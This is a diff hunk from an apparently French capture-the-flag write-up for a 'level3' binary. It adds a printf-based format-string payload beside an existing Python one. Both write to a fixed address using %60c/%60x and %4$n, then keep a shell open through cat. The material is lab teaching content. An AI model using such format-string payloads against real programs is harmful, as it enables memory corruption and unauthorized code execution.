@@ -64,6 +64,7 @@ Astuce : `%60c` évite de taper 60 fois "A".
 
 ```bash
 (python -c 'print "\x8c\x98\x04\x08%60c%4$n"'; cat) | ./level3
+(printf '\x8c\x98\x04\x08%%60x%%4$n'; cat) | ./level3
 ```
 
 Le `cat` (sans argument) lit le clavier et le recopie dans le tuyau, donc on peut
